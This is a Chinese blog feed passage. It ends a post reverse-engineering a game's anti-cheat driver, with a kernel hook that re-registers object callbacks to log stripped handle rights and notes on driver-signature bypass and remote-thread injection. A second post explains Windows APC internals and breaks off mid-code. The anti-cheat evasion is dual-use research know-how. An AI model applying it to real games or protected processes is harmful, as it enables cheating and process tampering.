可直接读取游戏内存，且驱动不会降权句柄。</p><p>再来具体分析一下降了哪些权限，虽然回调函数被 v 了，但是不妨碍可以做 <code>hook</code>，只要比较一下打开 <code>PROCESS_ALL_ACCESS</code> 的游戏句柄，看看最终得到的权限就行了，这里选择hook注册回调的函数，在注册回调的时候拦截，注册上自己的回调，自己的回调再调用真正的回调函数即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PreOperationCallback = <span class="literal">NULL</span>;</span><br><span class="line">PostOperationCallback = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">POB_PRE_OPERATION_CALLBACK <span class="title">gh_ObPreOperationCallback</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (PreOperationCallback &amp;&amp;!OperationInformation-&gt;KernelHandle) &#123;</span><br><span class="line">        <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;handle access(pre)=%x\n&quot;</span>,...);</span><br><span class="line">        <span class="built_in">PreOperationCallback</span>(RegistrationContext, OperationInformation);</span><br><span class="line">        <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;handle access(after)=%x\n&quot;</span>,...);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">gh_ObPostOperationCallback</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (PostOperationCallback &amp;&amp; !OperationInformation-&gt;KernelHandle) &#123;</span><br><span class="line">        <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;handle access(pre)=%x\n&quot;</span>,...);</span><br><span class="line">        <span class="built_in">PostOperationCallback</span>(RegistrationContext, OperationInformation);</span><br><span class="line">        <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;handle access(after)=%x\n&quot;</span>,...);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">gh_ObRegisterCallbacks</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;ObRegisterCallbacks operations=%d,preOperation=%p,PostOperation=%p\n&quot;</span>,...);</span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">ObRegisterCallbacks</span>(CallbackRegistration, RegistrationHandle);</span><br><span class="line">    <span class="built_in">ObUnRegisterCallbacks</span>(*RegistrationHandle);</span><br><span class="line">    *RegistrationHandle = <span class="number">0</span>;</span><br><span class="line">    PVOID gs_HandleCallback;</span><br><span class="line">    OB_CALLBACK_REGISTRATION obl_callback_reg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    OB_OPERATION_REGISTRATION ob2_operation = *CallbackRegistration-&gt;OperationRegistration;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">auto</span> ret2=<span class="built_in">ObRegisterCallbacks</span>(&amp;obl_callback_reg, &amp;gs_HandleCallback);<span class="comment">//自己注册一个回调</span></span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;status:%p\n&quot;</span>, ret2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自己写的驱动记得加 bypass check sign，不然会返回 <code>0xC0000022</code>。</p><p>最终打开游戏进程得到以下 <code>LOG</code></p><img src="/2025/02/14/Game6/handle.png" class=""><p>跟宏定义比对一下。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_TERMINATE                  (0x0001)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_CREATE_THREAD              (0x0002)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_SET_SESSIONID              (0x0004)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_VM_OPERATION               (0x0008)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_VM_READ                    (0x0010)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_VM_WRITE                   (0x0020)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_DUP_HANDLE                 (0x0040)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_CREATE_PROCESS             (0x0080)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_SET_QUOTA                  (0x0100)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_SET_INFORMATION            (0x0200)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_QUERY_INFORMATION          (0x0400)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_SUSPEND_RESUME             (0x0800)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_QUERY_LIMITED_INFORMATION  (0x1000)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCESS_SET_LIMITED_INFORMATION    (0x2000)  </span></span><br></pre></td></tr></table></figure><p>可以发现降了如下的权限：</p><ul><li><code>PROCESS_CREATE_THREAD</code>：创建线程</li><li><code>PROCESS_VM_OPERATION</code>：虚拟内存操作</li><li><code>PROCESS_VM_READ</code>：读内存</li><li><code>PROCESS_VM_WRITE</code>：写内存</li><li><code>PROCESS_DUP_HANDLE</code>：复制句柄</li><li><code>PROCESS_SET_INFORMATION</code>：设置线程优先级</li><li><code>PROCESS_SUSPEND_RESUME</code>：挂起和恢复</li></ul><h4 id="进程创建回调"><a href="#进程创建回调" class="headerlink" title="进程创建回调"></a>进程创建回调</h4><p>没研究出这个回调干了什么，一般情况下应该是会拦截一些黑工具的使用的，比如 CE 和 <code>xdbg</code> 之类的，没想到没拦，为了保证安全把回调直接取消了也可以。</p><h4 id="线程，模块回调"><a href="#线程，模块回调" class="headerlink" title="线程，模块回调"></a>线程，模块回调</h4><p>同样也是注册了但是貌似并没有使用，经测试，只把句柄回调去掉之后可以直接远线程注入游戏</p><img src="/2025/02/14/Game6/31.png" class=""><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>感谢 <a href="http://www.qfrost.com/">@Qfrost</a> 和 <a href="https://0xdeadc0de.badguys.club/">@上学困难户</a> 在分析过程中提供技术支持，本篇报告发布的时候，游戏已经升级到 5.4 版本。</p><img src="/2025/02/14/Game6/emoji3.png" class=""><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://github.com/waryas/KACE">https://github.com/waryas/KACE</a></li><li>[2]：<a href="https://github.com/LordNoteworthy/al-khaser">https://github.com/LordNoteworthy/al-khaser</a></li><li>[3]：<a href="https://github.com/hzqst/VmwareHardenedLoader">https://github.com/hzqst/VmwareHardenedLoader</a></li><li>[4]：<a href="https://bbs.kanxue.com/thread-249689.htm">https://bbs.kanxue.com/thread-249689.htm</a></li><li>[5]：<a href="https://www.cnblogs.com/LyShark/p/11639533.html">https://www.cnblogs.com/LyShark/p/11639533.html</a></li></ul>]]></content>
    
    
    <summary type="html">好久没碰某二次元开放世界冒险游戏了，听说新升级了反作弊，故来一探究竟，并尝试实现一些简单的功能。</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="游戏安全" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>windowsAPC学习（1）——APC简介</title>
    <link href="https://xia0ji233.github.io/2025/02/09/WindowsAPC1/"/>
    <id>https://xia0ji233.github.io/2025/02/09/WindowsAPC1/</id>
    <published>2025-02-09T12:00:00.000Z</published>
    <updated>2025-02-10T05:58:53.589Z</updated>
    
    <content type="html"><![CDATA[<p>来了解一下Windows的APC机制。</p><span id="more"></span><h2 id="APC"><a href="#APC" class="headerlink" title="APC"></a>APC</h2><h3 id="APC介绍"><a href="#APC介绍" class="headerlink" title="APC介绍"></a>APC介绍</h3><p><code>APC</code> 即 <code>Asyncroneus Procedure Call</code>，异步过程调用。学过之前的知识我们知道，线程是不能被<strong>杀掉</strong>、<strong>挂起</strong>和<strong>恢复</strong>的，线程在执行的时候自己占据着<code>CPU</code>，其他线程如何控制它呢？改变一个线程的行为，这就需要<code>APC</code>了。</p><h3 id="APC结构体"><a href="#APC结构体" class="headerlink" title="APC结构体"></a>APC结构体</h3><p>APC的结构体如下所示</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KAPC</span><br><span class="line">ntdll!_KAPC</span><br><span class="line">   <span class="number">+0x000</span> Type             : UChar</span><br><span class="line">   <span class="number">+0x001</span> SpareByte0       : UChar</span><br><span class="line">   <span class="number">+0x002</span> Size             : UChar</span><br><span class="line">   <span class="number">+0x003</span> SpareByte1       : UChar</span><br><span class="line">   <span class="number">+0x004</span> SpareLong0       : Uint4B</span><br><span class="line">   <span class="number">+0x008</span> Thread           : Ptr32 _KTHREAD</span><br><span class="line">   <span class="number">+0x00c</span> ApcListEntry     : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x014</span> KernelRoutine    : Ptr32     <span class="type">void</span> </span><br><span class="line">   <span class="number">+0x018</span> RundownRoutine   : Ptr32     <span class="type">void</span> </span><br><span class="line">   <span class="number">+0x01c</span> NormalRoutine    : Ptr32     <span class="type">void</span> </span><br><span class="line">   <span class="number">+0x020</span> NormalContext    : Ptr32 Void</span><br><span class="line">   <span class="number">+0x024</span> SystemArgument1  : Ptr32 Void</span><br><span class="line">   <span class="number">+0x028</span> SystemArgument2  : Ptr32 Void</span><br><span class="line">   <span class="number">+0x02c</span> ApcStateIndex    : Char</span><br><span class="line">   <span class="number">+0x02d</span> ApcMode          : Char</span><br><span class="line">   <span class="number">+0x02e</span> Inserted         : UChar</span><br></pre></td></tr></table></figure><p>在线程中，还有一个跟 APC 相关的结构体。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">....</span><br><span class="line">   <span class="number">+0x040</span> ApcState         : _KAPC_STATE</span><br><span class="line">....</span><br><span class="line">kd&gt; dt _KAPC_STATE</span><br><span class="line">ntdll!_KAPC_STATE</span><br><span class="line">   <span class="number">+0x000</span> ApcListHead      : [<span class="number">2</span>] _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x010</span> Process          : Ptr32 _KPROCESS</span><br><span class="line">   <span class="number">+0x014</span> KernelApcInProgress : UChar</span><br><span class="line">   <span class="number">+0x015</span> KernelApcPending : UChar</span><br><span class="line">   <span class="number">+0x016</span> UserApcPending   : UChar</span><br></pre></td></tr></table></figure><p>下面来介绍一下相关成员：</p><ul><li><code>ApcListHead</code>：是个双向链表的数组，一共有两个成员，所谓的<code>APC</code>就是插入到里面的，一个是用户APC队列，一个是内核APC队列。</li><li><code>Process</code>：线程线程所属或者所挂靠的进程，这个在逆向线程切换的时候我们就用过。具体细节都在进程线程篇的总结与提升讲过，就不再赘述了。</li><li><code>KernelApcInProgress</code>：指示内核<code>APC</code>是否正在执行。</li><li><code>KernelApcPending</code>：指示是否有正在等待执行的内核<code>APC</code>。</li><li><code>UserApcPending</code>：指示是否有正在等待执行的用户<code>APC</code>。</li></ul><h3 id="备用APC队列"><a href="#备用APC队列" class="headerlink" title="备用APC队列"></a>备用APC队列</h3><p>看到线程跟 APC 相关的成员：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line">   <span class="number">+0x040</span> ApcState         : _KAPC_STATE</span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line">   <span class="number">+0x134</span> ApcStateIndex    : UChar</span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line">   <span class="number">+0x168</span> ApcStatePointer  : [<span class="number">2</span>] Ptr32 _KAPC_STATE</span><br><span class="line">   <span class="number">+0x170</span> SavedApcState    : _KAPC_STATE</span><br><span class="line">   <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>可以看到除了一个 APC 队列的成员 <code>ApcState</code> 以外 ，还有一个备用 APC 队列 <code>SavedApcState</code>，为什么要有一个这个且听笔者娓娓道来。</p><p>考虑一种情况：P1 进程产生了线程 T1，此时它要去挂靠 P2 进程，挂靠之后 T1 线程的页目录基址被切换到了进程 P2。如果此时往该线程插入 APC 让它指定读取某个地址的内存，本意可能想读取 P1 进程的内存，可是却读到了 P2 进程的内存。为了避免这种情况的发生，在线程处于挂靠状态的时候，<code>ApcState</code> 中的值就会存到 <code>SavedApcState</code> 中。而 <code>ApcState</code> 则会存储 P2 进程相关的 APC 队列。</p><p>总结一句话就是：<code>ApcState</code> 总会存储当前线程所挂靠的进程的 <code>APC</code> 队列。</p><p>可是，如何判断当前进程是自己的“生父”进程而不是“养父”进程呢？</p><h3 id="ApcStateIndex"><a href="#ApcStateIndex" class="headerlink" title="ApcStateIndex"></a>ApcStateIndex</h3><p>用来标识当前线程处于什么状态。如果值为0则为正常状态；如果值为1则为挂靠状态，这也就回答了刚刚那个问题。</p><h3 id="ApcStatePointer"><a href="#ApcStatePointer" class="headerlink" title="ApcStatePointer"></a>ApcStatePointer</h3><p>这里存储了两个 APC 队列，为了操作方便，<code>ApcStatePointer[0]</code> 总能取得自己的“生父”进程相关的 APC 队列。</p><table><thead><tr><th align="center">情况</th><th align="center">ApcStatePointer[0]</th><th align="center">ApcStatePointer[1]</th></tr></thead><tbody><tr><td align="center">正常情况</td><td align="center">ApcState</td><td align="center">SavedApcState</td></tr><tr><td align="center">挂靠情况</td><td align="center">SavedApcState</td><td align="center">ApcState</td></tr></tbody></table><p>而 <code>ApcStatePointer[ApcStateIndex]</code> 总能取得 <code>ApcState</code> 的值。</p><h2 id="挂起，杀死线程分析"><a href="#挂起，杀死线程分析" class="headerlink" title="挂起，杀死线程分析"></a>挂起，杀死线程分析</h2><p>R3 代码就不分析了，直接看到 <code>nt!NtTerminateThread</code> 函数，最终调用了 <code>nt!PspTerminateThreadByPointer</code> 函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">PspTerminateThreadByPointer</span><span class="params">(_KTHREAD *Thread, NTSTATUS a2, <span class="type">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *p_WaitTime; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">    PVOID addr; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">void</span> *v7; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">    p_WaitTime = (<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;Thread[<span class="number">1</span>].WaitTime;</span><br><span class="line">    <span class="keyword">if</span> ( (Thread[<span class="number">1</span>].WaitTime &amp; <span class="number">0x40</span>) != <span class="number">0</span> &amp;&amp; ((<span class="type">int</span>)Thread-&gt;Process[<span class="number">4</span>].ProfileListHead.Flink &amp; <span class="number">0x40000008</span>) == <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">PspCatchCriticalBreak</span>(<span class="string">&quot;Terminating critical thread 0x%p (in %s)\n&quot;</span>, &amp;Thread-&gt;Process[<span class="number">2</span>].Affinity.Reserved);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &amp;&amp; Thread == <span class="built_in">KeGetCurrentThread</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">        _InterlockedOr(p_WaitTime, <span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">PspExitThread</span>((_KSTACK_COUNT)a2);</span><br><span class="line">        __debugbreak();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (Thread-&gt;MiscFlags &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1073741790</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (*p_WaitTime &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        addr = <span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, <span class="number">0x30u</span>, <span class="number">0x78457350u</span>);</span><br><span class="line">        v7 = addr;</span><br><span class="line">        <span class="keyword">if</span> ( addr )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">KeDelayExecutionThread</span>(<span class="number">0</span>, <span class="number">0</span>, (PLARGE_INTEGER)&amp;PspShortTime);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( _interlockedbittestandset(p_WaitTime, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>(addr, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">KeInitializeApc</span>(addr, Thread, <span class="number">0</span>, PsExitSpecialApc, PspExitApcRundown, PspExitNormalApc, <span class="number">0</span>, a2);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">KeInsertQueueApc</span>(v7, v7, <span class="number">0</span>, <span class="number">2</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">KeAlertThread</span>(Thread, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">KeForceResumeThread</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">ExFreePoolWithTag</span>(v7, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1073741823</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，如果要杀死的线程为当前线程，那么直接自己执行 <code>PspExitThread</code> 退出。否则往指定的线程插入 APC，使得线程自杀，挂起线程同理。</p><h2 id="附加进程分析"><a href="#附加进程分析" class="headerlink" title="附加进程分析"></a>附加进程分析</h2><p>也就是传说中的 <code>KeStackAttachProcess</code> 函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __stdcall <span class="title">KeStackAttachProcess</span><span class="params">(PRKPROCESS PROCESS, PRKAPC_STATE ApcState)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _KTHREAD *CurrentThread; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">volatile</span> __int32 *p_ApcQueueLock; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">    KIRQL NewIrql; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    CurrentThread = <span class="built_in">KeGetCurrentThread</span>();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="built_in">KeGetPcr</span>()-&gt;PrcbData.DpcRequestSummary &amp; <span class="number">0x10001</span>) != <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">KeBugCheckEx</span>(</span><br><span class="line">        <span class="number">5u</span>,</span><br><span class="line">        (ULONG_PTR)PROCESS,</span><br><span class="line">        (ULONG_PTR)CurrentThread-&gt;ApcState.Process,</span><br><span class="line">        CurrentThread-&gt;ApcStateIndex,</span><br><span class="line">        <span class="built_in">KeGetPcr</span>()-&gt;PrcbData.DpcRequestSummary &amp; <span class="number">0x10001</span>);</span><br><span class="line">    <span class="keyword">if</span> ( CurrentThread-&gt;ApcState.Process == PROCESS )</span><br><span class="line">    &#123;</span><br><span class="line">        ApcState-&gt;Process = (_KPROCESS *)<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        NewIrql = <span class="built_in">KeRaiseIrqlToDpcLevel</span>();</span><br><span class="line">        p_ApcQueueLock = (<span class="keyword">volatile</span> __int32 *)&amp;CurrentThread-&gt;ApcQueueLock;</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( _InterlockedExchange(p_ApcQueueLock, <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( (++v4 &amp; HvlLongSpinCountMask) != <span class="number">0</span> || (HvlEnlightenments &amp; <span class="number">0x40</span>) == <span class="number">0</span> )</span><br><span class="line">                    _mm_pause();</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">HvlNotifyLongSpinWait</span>(v4);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( *p_ApcQueueLock );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( CurrentThread-&gt;ApcStateIndex )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">KiAttachProcess</span>(CurrentThread, PROCESS, NewIrql, ApcState);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">KiAttachProcess</span>(CurrentThread, PROCESS, NewIrql, &amp;CurrentThread-&gt;SavedApcState);</span><br><span class="line">            ApcState-&gt;Process = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要附加的进程和当前线程的 <code>ApcState</code> 指向的进程相同，那么直接把传入的 <code>APCState-&gt;Process</code> 置为 1，用过这个 API 的应该知道，这个 <code>APCState</code> 是要在取消附加进程的时候用到的，如果进程相同根本没必要附加，因此就置为了 1，应该会做一些特殊判断。</p><p>果然，稍微一翻取消附加进程的函数 <code>KeUnstackDetachProcess</code>，就可以看到这样的一句话： </p><blockquote><p><code>if ( ApcState-&gt;Process != (_KPROCESS *)1 )</code></p></blockquote><p>继续分析，如果要尝试挂靠某个进程，那么先获取当前线程的 <code>APC</code> 队列的锁。然后判断当前是否为挂靠状态，如果是则使用传入的 <code>ApcState</code> 指针，如果不是则使用备用 <code>APC</code> 队列传入，那么用户传入的 <code>APC</code> 中的 <code>Process</code> 被设为 0。</p><p>然后继续分析 <code>KiAttachProcess</code> 函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __userpurge <span class="title">KiAttachProcess</span><span class="params">(_KTHREAD *thread@&lt;eax&gt;, _KPROCESS *process, KIRQL NewIrql, KAPC_STATE *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    KAPC_STATE *p_ApcState; <span class="comment">// edi</span></span><br><span class="line">    <span class="keyword">volatile</span> __int32 *p_ApcQueueLock; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">int</span> processa; <span class="comment">// [esp+14h] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">    p_ApcState = &amp;thread-&gt;ApcState;</span><br><span class="line">    <span class="built_in">KiMoveApcState</span>(a4, thread-&gt;ApcState.ApcListHead);</span><br><span class="line">    thread-&gt;ApcState.ApcListHead[<span class="number">0</span>].Blink = thread-&gt;ApcState.ApcListHead;</span><br><span class="line">    p_ApcState-&gt;ApcListHead[<span class="number">0</span>].Flink = (_LIST_ENTRY *)p_ApcState;</span><br><span 